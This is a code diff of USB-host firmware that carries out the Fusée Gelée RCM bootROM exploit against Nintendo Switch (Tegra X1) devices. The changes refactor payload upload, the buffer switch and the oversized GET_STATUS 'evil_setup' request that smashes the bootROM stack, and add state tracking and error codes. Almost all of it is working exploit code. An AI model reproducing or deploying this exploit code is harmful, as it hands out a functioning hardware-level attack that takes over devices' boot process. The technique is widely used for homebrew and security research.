@@ -5,8 +5,7 @@
 #include "host/usbh_pvt.h"
 #include <string.h>
 
-#include "bin/hekate_ctcaer_6.5.2.hex"
-#include "bin/intermezzo.hex"
+#include "rcm_image.h"
 
 #define USB_VID 0x0955
 #define USB_PID 0x7321
@@ -16,22 +15,19 @@
 #define USB_PACKET_SIZE 0x1000u
 #define USB_XFER_TIMEOUT_MS 1000u
 #define SMASH_XFER_TIMEOUT_MS 1000u
-#define RCM_COMMAND_PAYLOAD_OFFSET 680u
-#define RCM_PAYLOAD_ADDR 0x40010000
-#define PAYLOAD_START_ADDR 0x40010E40
-#define STACK_SPRAY_START 0x40014E40
-#define STACK_SPRAY_END 0x40017000
-#define STACK_END 0x40010000
+#define COPY_BUFFER_LOW_ADDR 0x40005000u
+#define COPY_BUFFER_HIGH_ADDR 0x40009000u
+#define STACK_END 0x40010000u
+#define SMASH_BUFFER_SIZE (STACK_END - COPY_BUFFER_HIGH_ADDR)
 
-#define RCM_MAX_LENGTH 0x30298u
+static uint8_t smash_buffer[SMASH_BUFFER_SIZE] = {0};
 
-uint8_t payload_buffer[RCM_MAX_LENGTH] = {0};
-
-const uint32_t COPY_BUFFER_ADDRESSES[2] = {0x40005000, 0x40009000};
+const uint32_t COPY_BUFFER_ADDRESSES[2] = {COPY_BUFFER_LOW_ADDR, COPY_BUFFER_HIGH_ADDR};
 
 volatile int error_line = 0;
 
 static int current_buffer = 0;
+static uint8_t active_daddr = 0;
 static bool status_led_ready = false;
 
 typedef struct {
@@ -40,21 +36,53 @@ typedef struct {
     volatile uint32_t actual_len;
 } sync_xfer_t;
 
+typedef enum {
+    FUSEE_STATE_IDLE = 0,
+    FUSEE_STATE_READING_ID,
+    FUSEE_STATE_UPLOADING,
+    FUSEE_STATE_SWITCHING_BUFFER,
+    FUSEE_STATE_SMASHING,
+    FUSEE_STATE_DONE,
+    FUSEE_STATE_ERROR,
+} fusee_state_t;
+
+typedef enum {
+    LAUNCH_ERROR_NONE = 0,
+    LAUNCH_ERROR_DESCRIPTOR,
+    LAUNCH_ERROR_DEVICE_ID,
+    LAUNCH_ERROR_IMAGE_LAYOUT,
+    LAUNCH_ERROR_UPLOAD,
+    LAUNCH_ERROR_HIGH_BUFFER,
+    LAUNCH_ERROR_SMASH_SUBMIT,
+    LAUNCH_ERROR_SMASH_BUFFER,
+} launch_error_t;
+
+typedef enum {
+    SMASH_RESULT_SUBMITTED = 0,
+    SMASH_RESULT_TIMEOUT,
+    SMASH_RESULT_BUFFER_TOO_SMALL,
+    SMASH_RESULT_SUBMIT_FAILED,
+} smash_result_t;
+
+volatile launch_error_t last_error = LAUNCH_ERROR_NONE;
+volatile fusee_state_t fusee_state = FUSEE_STATE_IDLE;
+
 static void _panic(int);
 static void assert_true(bool, int);
-static void assert_success(xfer_result_t, int);
 static void set_status_led(bool);
 void tuh_mount_cb(uint8_t);
-static inline uint32_t align_up(uint32_t, uint32_t);
 static inline uint32_t get_current_buffer_address();
 static inline void toggle_buffer();
+static void reset_launch_state(void);
 static void sync_xfer_cb(tuh_xfer_t*);
 static bool wait_for_xfer(sync_xfer_t*, uint32_t);
-static xfer_result_t endpoint_xfer(uint8_t, uint8_t, uint8_t*, uint32_t, uint32_t*, uint32_t, int);
-void trigger_controlled_memcpy(uint8_t);
-void endpoint_read(uint8_t, uint8_t*, uint32_t);
-void payload_write(uint8_t, uint8_t const*, uint8_t const*);
-uint8_t *build_payload(void);
+static bool endpoint_xfer(uint8_t, uint8_t, uint8_t*, uint32_t, uint32_t*, uint32_t, xfer_result_t*);
+static smash_result_t trigger_controlled_memcpy(uint8_t);
+static bool endpoint_read(uint8_t, uint8_t*, uint32_t);
+static bool payload_write(uint8_t, uint8_t const*, uint8_t const*);
+static bool switch_to_highbuf(uint8_t);
+static void fail_launch(launch_error_t);
+static void launch_payload(uint8_t);
 
 static bool rcm_driver_init(void);
 static bool rcm_driver_deinit(void);
@@ -108,10 +136,6 @@ static void assert_true(bool expr, int line)
     if (!expr)
         _panic(line);
 }
-static void assert_success(xfer_result_t res, int line)
-{
-    assert_true(res == XFER_RESULT_SUCCESS, line);
-}
 
 static void set_status_led(bool led_on)
 {
@@ -129,9 +153,14 @@ static inline uint32_t get_current_buffer_address()
 {
     return COPY_BUFFER_ADDRESSES[current_buffer];
 }
-static inline uint32_t align_up(uint32_t value, uint32_t alignment)
+
+static void reset_launch_state(void)
 {
-    return (value + alignment - 1) & ~(alignment - 1);
+    current_buffer = 0;
+    active_daddr = 0;
+    last_error = LAUNCH_ERROR_NONE;
+    fusee_state = FUSEE_STATE_IDLE;
+    set_status_led(false);
 }
 
 static void sync_xfer_cb(tuh_xfer_t *xfer)
@@ -158,9 +187,9 @@ static bool wait_for_xfer(sync_xfer_t *sync, uint32_t timeout_ms)
     return true;
 }
 
-static xfer_result_t endpoint_xfer(uint8_t daddr, uint8_t ep_addr, uint8_t *buffer,
-                                   uint32_t length, uint32_t *actual_len,
-                                   uint32_t timeout_ms, int line)
+static bool endpoint_xfer(uint8_t daddr, uint8_t ep_addr, uint8_t *buffer,
+                          uint32_t length, uint32_t *actual_len,
+                          uint32_t timeout_ms, xfer_result_t *result)
 {
     sync_xfer_t sync = {
         .complete = false,
@@ -177,15 +206,21 @@ static xfer_result_t endpoint_xfer(uint8_t daddr, uint8_t ep_addr, uint8_t *buff
         .user_data = (uintptr_t) &sync,
     };
 
-    assert_true(tuh_edpt_xfer(&xfer), line);
-    assert_true(wait_for_xfer(&sync, timeout_ms), line);
+    if (!tuh_edpt_xfer(&xfer) || !wait_for_xfer(&sync, timeout_ms))
+    {
+        return false;
+    }
 
     if (actual_len)
     {
         *actual_len = sync.actual_len;
     }
+    if (result)
+    {
+        *result = sync.result;
+    }
 
-    return sync.result;
+    return true;
 }
 
 static bool rcm_driver_init(void)
@@ -270,11 +305,20 @@ static bool rcm_driver_xfer_cb(uint8_t daddr, uint8_t ep_addr,
 
 static void rcm_driver_close(uint8_t daddr)
 {
-    (void) daddr;
+    if (daddr == active_daddr)
+    {
+        reset_launch_state();
+    }
 }
 
-void trigger_controlled_memcpy(uint8_t daddr)
+static smash_result_t trigger_controlled_memcpy(uint8_t daddr)
 {
+    uint32_t length = STACK_END - get_current_buffer_address();
+    if (length > sizeof(smash_buffer))
+    {
+        return SMASH_RESULT_BUFFER_TOO_SMALL;
+    }
+
     tusb_control_request_t evil_setup = {
         .bmRequestType_bit = {
             .direction = TUSB_DIR_IN,
@@ -284,43 +328,53 @@ void trigger_controlled_memcpy(uint8_t daddr)
         .bRequest = TUSB_REQ_GET_STATUS,
         .wValue = 0,
         .wIndex = 0,
-        .wLength = STACK_END - get_current_buffer_address(),
+        .wLength = length,
     };
 
-    // perform exploit
-    tuh_xfer_t evil = {
-        .daddr = daddr,
-        .ep_addr = 0,
-        .setup = &evil_setup,
-        .buffer = payload_buffer,
-        .complete_cb = sync_xfer_cb,
-        .user_data = 0,
-    };
     sync_xfer_t sync = {
         .complete = false,
         .result = XFER_RESULT_INVALID,
         .actual_len = 0,
     };
-    evil.user_data = (uintptr_t) &sync;
 
-    // The smash normally makes the target stop responding, so timeout/stall here
-    // can be the expected end state rather than a failure.
-    if (tuh_control_xfer(&evil))
+    tuh_xfer_t evil = {
+        .daddr = daddr,
+        .ep_addr = 0,
+        .setup = &evil_setup,
+        .buffer = smash_buffer,
+        .complete_cb = sync_xfer_cb,
+        .user_data = (uintptr_t) &sync,
+    };
+
+    if (!tuh_control_xfer(&evil))
     {
-        (void) wait_for_xfer(&sync, SMASH_XFER_TIMEOUT_MS);
+        return SMASH_RESULT_SUBMIT_FAILED;
     }
+
+    // The smash normally makes the target stop responding, so a timeout can be
+    // the expected end state.
+    if (!wait_for_xfer(&sync, SMASH_XFER_TIMEOUT_MS))
+    {
+        return SMASH_RESULT_TIMEOUT;
+    }
+
+    return SMASH_RESULT_SUBMITTED;
 }
 
-void endpoint_read(uint8_t daddr, uint8_t *buffer, uint32_t length)
+static bool endpoint_read(uint8_t daddr, uint8_t *buffer, uint32_t length)
 {
     uint32_t actual_len = 0;
-    xfer_result_t result = endpoint_xfer(daddr, USB_EP_IN, buffer, length,
-                                         &actual_len, USB_XFER_TIMEOUT_MS, __LINE__);
-    assert_success(result, __LINE__);
-    assert_true(actual_len == length, __LINE__);
+    xfer_result_t result = XFER_RESULT_INVALID;
+    if (!endpoint_xfer(daddr, USB_EP_IN, buffer, length,
+                       &actual_len, USB_XFER_TIMEOUT_MS, &result))
+    {
+        return false;
+    }
+
+    return result == XFER_RESULT_SUCCESS && actual_len == length;
 }
 
-void payload_write(uint8_t daddr, uint8_t const *startp, uint8_t const *endp)
+static bool payload_write(uint8_t daddr, uint8_t const *startp, uint8_t const *endp)
 {
     uint32_t length = endp - startp;
 
@@ -331,101 +385,118 @@ void payload_write(uint8_t daddr, uint8_t const *startp, uint8_t const *endp)
         toggle_buffer();
 
         uint32_t actual_len = 0;
-        xfer_result_t result = endpoint_xfer(daddr, USB_EP_OUT, (uint8_t*) startp,
-                                             bytes_to_transmit, &actual_len,
-                                             USB_XFER_TIMEOUT_MS, __LINE__);
-        assert_success(result, __LINE__);
-        assert_true(actual_len == bytes_to_transmit, __LINE__);
+        xfer_result_t result = XFER_RESULT_INVALID;
+        if (!endpoint_xfer(daddr, USB_EP_OUT, (uint8_t*) startp,
+                           bytes_to_transmit, &actual_len,
+                           USB_XFER_TIMEOUT_MS, &result))
+        {
+            return false;
+        }
+        if (result != XFER_RESULT_SUCCESS || actual_len != bytes_to_transmit)
+        {
+            return false;
+        }
         startp += bytes_to_transmit;
     }
+
+    return true;
 }
 
-void switch_to_highbuf(uint8_t daddr) {
+static bool switch_to_highbuf(uint8_t daddr) {
     if (get_current_buffer_address() != COPY_BUFFER_ADDRESSES[1]) {
         static const uint8_t buf[USB_PACKET_SIZE] = { 0 };
-        payload_write(daddr, buf, buf + sizeof(buf));
-    }
-}
-
-uint8_t *build_payload(void)
-{
-    assert_true((USB_PACKET_SIZE & (USB_PACKET_SIZE - 1)) == 0, __LINE__);
-    assert_true((RCM_PAYLOAD_ADDR + sizeof(intermezzo)) <= PAYLOAD_START_ADDR, __LINE__);
-    assert_true(STACK_SPRAY_START >= PAYLOAD_START_ADDR, __LINE__);
-    assert_true(STACK_SPRAY_END >= STACK_SPRAY_START, __LINE__);
-    assert_true(((STACK_SPRAY_END - STACK_SPRAY_START) % 4) == 0, __LINE__);
-
-    uint32_t intermezzo_padding = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + sizeof(intermezzo));
-    uint32_t payload_before_spray = STACK_SPRAY_START - PAYLOAD_START_ADDR;
-    uint32_t stack_spray_len = STACK_SPRAY_END - STACK_SPRAY_START;
-    uint32_t payload_tail_len = sizeof(payload) > payload_before_spray ? sizeof(payload) - payload_before_spray : 0;
-    uint32_t payload_size = RCM_COMMAND_PAYLOAD_OFFSET + sizeof(intermezzo) + intermezzo_padding +
-                            payload_before_spray + stack_spray_len + payload_tail_len;
-    uint32_t padded_size = align_up(payload_size, USB_PACKET_SIZE);
-
-    assert_true(padded_size <= RCM_MAX_LENGTH, __LINE__);
-
-    uint8_t *buf_p = payload_buffer;
-
-    memset(payload_buffer, 0, padded_size);
-
-    *buf_p++ = RCM_MAX_LENGTH & 0xFF;
-    *buf_p++ = (RCM_MAX_LENGTH >> 8) & 0xFF;
-    *buf_p++ = (RCM_MAX_LENGTH >> 16) & 0xFF;
-    *buf_p++ = (RCM_MAX_LENGTH >> 24) & 0xFF;
-
-    buf_p = &payload_buffer[RCM_COMMAND_PAYLOAD_OFFSET];
-
-    memcpy(buf_p, intermezzo, sizeof(intermezzo));
-    buf_p += sizeof(intermezzo);
-
-    buf_p += intermezzo_padding;
-
-    uint32_t first_payload_len = sizeof(payload) < payload_before_spray ? sizeof(payload) : payload_before_spray;
-    memcpy(buf_p, payload, first_payload_len);
-    buf_p += payload_before_spray;
-
-    uint32_t repeat_count = stack_spray_len / 4;
-    for (uint32_t i = 0; i < repeat_count; ++i)
-    {
-        for (uint32_t j = 0; j < 4; ++j)
+        if (!payload_write(daddr, buf, buf + sizeof(buf)))
         {
-            *buf_p++ = (RCM_PAYLOAD_ADDR >> (j * 8)) & 0xFF;
+            return false;
         }
     }
 
-    if (sizeof(payload) > payload_before_spray)
+    return true;
+}
+
+static void fail_launch(launch_error_t error)
+{
+    if (active_daddr == 0)
     {
-        memcpy(buf_p, &payload[payload_before_spray], payload_tail_len);
-        buf_p += payload_tail_len;
+        reset_launch_state();
+        return;
     }
 
-    assert_true((uint32_t)(buf_p - payload_buffer) == payload_size, __LINE__);
+    last_error = error;
+    fusee_state = FUSEE_STATE_ERROR;
+    set_status_led(false);
+}
 
-    return payload_buffer + padded_size;
+static void launch_payload(uint8_t daddr)
+{
+    current_buffer = 0;
+    active_daddr = daddr;
+    last_error = LAUNCH_ERROR_NONE;
+    set_status_led(false);
+
+    if ((RCM_IMAGE_LEN % USB_PACKET_SIZE) != 0 || RCM_IMAGE_LEN > RCM_IMAGE_MAX_LENGTH)
+    {
+        fail_launch(LAUNCH_ERROR_IMAGE_LAYOUT);
+        return;
+    }
+
+    fusee_state = FUSEE_STATE_READING_ID;
+    uint8_t device_id[16];
+    if (!endpoint_read(daddr, device_id, sizeof(device_id)))
+    {
+        fail_launch(LAUNCH_ERROR_DEVICE_ID);
+        return;
+    }
+
+    fusee_state = FUSEE_STATE_UPLOADING;
+    if (!payload_write(daddr, rcm_image, rcm_image + RCM_IMAGE_LEN))
+    {
+        fail_launch(LAUNCH_ERROR_UPLOAD);
+        return;
+    }
+
+    fusee_state = FUSEE_STATE_SWITCHING_BUFFER;
+    if (!switch_to_highbuf(daddr))
+    {
+        fail_launch(LAUNCH_ERROR_HIGH_BUFFER);
+        return;
+    }
+
+    fusee_state = FUSEE_STATE_SMASHING;
+    smash_result_t smash_result = trigger_controlled_memcpy(daddr);
+    if (smash_result == SMASH_RESULT_BUFFER_TOO_SMALL)
+    {
+        fail_launch(LAUNCH_ERROR_SMASH_BUFFER);
+        return;
+    }
+    if (smash_result == SMASH_RESULT_SUBMIT_FAILED)
+    {
+        fail_launch(LAUNCH_ERROR_SMASH_SUBMIT);
+        return;
+    }
+
+    fusee_state = FUSEE_STATE_DONE;
+    set_status_led(true);
 }
 
 void tuh_mount_cb(uint8_t daddr)
 {
-    // verify that the device is an RCM switch attached
+    if (fusee_state != FUSEE_STATE_IDLE)
+    {
+        return;
+    }
+
     tusb_desc_device_t desc;
-    assert_success(tuh_descriptor_get_device_sync(daddr, &desc, sizeof(tusb_desc_device_t)), __LINE__);
+    xfer_result_t desc_result = tuh_descriptor_get_device_sync(daddr, &desc, sizeof(tusb_desc_device_t));
+    if (desc_result != XFER_RESULT_SUCCESS)
+    {
+        fail_launch(LAUNCH_ERROR_DESCRIPTOR);
+        return;
+    }
     if (desc.idVendor != USB_VID || desc.idProduct != USB_PID)
     {
         return;
     }
 
-    uint8_t device_id[16];
-    endpoint_read(daddr, device_id, sizeof(device_id));
-
-    // Upload the payload
-    uint8_t *buf_p = build_payload();
-    payload_write(daddr, payload_buffer, buf_p);
-
-    switch_to_highbuf(daddr);
-
-    trigger_controlled_memcpy(daddr);
-
-    set_status_led(true);
-    while(1);
+    launch_payload(daddr);
 }
